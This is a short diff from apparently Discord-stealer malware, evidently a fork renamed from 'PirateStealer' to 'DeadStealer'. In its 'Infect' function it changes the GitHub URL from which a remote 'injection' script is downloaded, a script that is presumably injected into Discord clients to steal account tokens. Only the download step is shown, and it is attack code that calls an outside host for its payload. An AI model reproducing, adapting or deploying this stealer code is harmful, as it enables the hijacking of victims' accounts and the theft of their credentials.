@@ -41,7 +41,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/zADylan/PirateStealer/main/injection/injection-clean.js', (resp) => {
+    https.get('https://raw.githubusercontent.com/Varantgames/DeadStealer/main/injection/injection-clean.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
